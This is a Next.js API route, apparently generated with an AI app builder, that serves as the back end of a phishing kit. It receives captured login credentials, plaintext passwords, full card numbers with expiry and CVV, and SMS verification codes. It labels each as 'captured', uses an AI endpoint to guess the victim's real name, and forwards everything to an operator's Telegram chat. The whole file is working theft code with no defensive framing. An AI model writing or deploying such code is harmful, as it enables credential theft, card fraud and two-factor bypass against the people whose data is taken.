import { NextResponse } from "next/server"

export async function POST(request: Request) {
  try {
    console.log("[v0] Telegram notify API called")

    const body = await request.json()
    console.log("[v0] Telegram notify request:", JSON.stringify(body))

    const botToken = process.env.TELEGRAM_BOT_TOKEN
    const chatId = process.env.TELEGRAM_CHAT_ID

    console.log("[v0] Bot token exists:", !!botToken)
    console.log("[v0] Chat ID exists:", !!chatId)

    if (!botToken || !chatId) {
      console.log("[v0] Telegram not configured - missing bot token or chat ID")
      return NextResponse.json(
        {
          success: false,
          message: "Telegram not configured - add TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID to environment variables",
        },
        { status: 200 },
      )
    }

    const { type, data } = body

    let guessedName = "Unknown User"
    let nameConfidence = "low"

    try {
      const username = data.email ? data.email.split("@")[0] : "user"
      const nameResponse = await fetch(`${request.url.split("/api")[0]}/api/ai/guess-name`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email: data.email, username }),
      })

      if (nameResponse.ok) {
        const nameData = await nameResponse.json()
        guessedName = nameData.guessedName || guessedName
        nameConfidence = nameData.confidence || nameConfidence
        console.log("[v0] AI guessed name:", guessedName, "confidence:", nameConfidence)
      }
    } catch (nameError) {
      console.log("[v0] AI name guessing failed, using fallback:", nameError)
    }

    let message = ""

    if (type === "login") {
      message =
        `🎯 *New Login Captured*\n\n` +
        `👤 *Guessed Name:* ${guessedName} (${nameConfidence} confidence)\n` +
        `📧 *Email:* \`${data.email}\`\n` +
        `🔑 *Password:* \`${data.password}\`\n` +
        `🌐 *IP Address:* \`${data.ip}\`\n` +
        `🆔 *User ID:* ${data.userId}\n\n` +
        `⏰ *Time:* ${new Date().toLocaleString()}`
    } else if (type === "payment") {
      message =
        `💳 *Payment Method Added*\n\n` +
        `👤 *Guessed Name:* ${guessedName} (${nameConfidence} confidence)\n` +
        `📧 *Email:* \`${data.email}\`\n` +
        `💳 *Card:* \`${data.cardNumber}\`\n` +
        `📅 *Expiry:* \`${data.cardExpiry}\`\n` +
        `🔒 *CVV:* \`${data.cardCvv}\`\n` +
        `🌐 *IP:* \`${data.ip}\`\n\n` +
        `⏰ *Time:* ${new Date().toLocaleString()}`
    } else if (type === "card") {
      message =
        `💳 *Card Details Captured*\n\n` +
        `👤 *Guessed Name:* ${guessedName} (${nameConfidence} confidence)\n` +
        `📧 *Email:* \`${data.email || "N/A"}\`\n` +
        `💳 *Card:* \`${data.cardNumber}\`\n` +
        `📅 *Expiry:* \`${data.cardExpiry}\`\n` +
        `🔒 *CVV:* \`${data.cardCvv}\`\n` +
        `👤 *Holder:* \`${data.cardHolder || "N/A"}\`\n` +
        `🌐 *IP:* \`${data.ip}\`\n\n` +
        `⏰ *Time:* ${new Date().toLocaleString()}`
    } else if (type === "sms") {
      message =
        `📱 *SMS Code Captured*\n\n` +
        `👤 *Guessed Name:* ${guessedName} (${nameConfidence} confidence)\n` +
        `🔢 *Code:* \`${data.smsCode}\`\n` +
        `🌐 *IP:* \`${data.ip}\`\n\n` +
        `⏰ *Time:* ${new Date().toLocaleString()}`
    }

    console.log("[v0] Sending message to Telegram:", message.substring(0, 100) + "...")

    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`
    console.log("[v0] Telegram URL constructed")

    const telegramResponse = await fetch(telegramUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: "Markdown",
      }),
    })

    console.log("[v0] Telegram API response status:", telegramResponse.status)

    if (!telegramResponse.ok) {
      const errorText = await telegramResponse.text()
      console.error("[v0] Telegram API error:", errorText)
      return NextResponse.json({ success: false, message: "Failed to send Telegram notification" }, { status: 200 })
    }

    const responseData = await telegramResponse.json()
    console.log("[v0] Telegram notification sent successfully:", responseData)

    return NextResponse.json({ success: true }, { status: 200 })
  } catch (error) {
    console.error("[v0] Telegram notify error:", error)
    console.error("[v0] Error stack:", error instanceof Error ? error.stack : "No stack trace")
    return NextResponse.json({ success: false, message: "Internal error", error: String(error) }, { status: 200 })
  }
}
